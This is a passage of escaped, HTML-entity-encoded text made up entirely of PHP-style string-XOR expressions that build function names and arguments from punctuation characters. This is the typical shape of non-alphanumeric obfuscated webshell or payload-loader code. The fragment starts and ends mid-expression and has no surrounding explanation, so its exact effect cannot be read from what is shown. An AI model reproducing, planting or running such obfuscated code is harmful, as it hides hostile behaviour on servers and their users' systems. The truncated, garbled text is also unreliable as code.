39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;),(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;),((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)),(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;),((\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;))(),((\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;))(),((\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;))(),((\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;))()))).(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))(((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;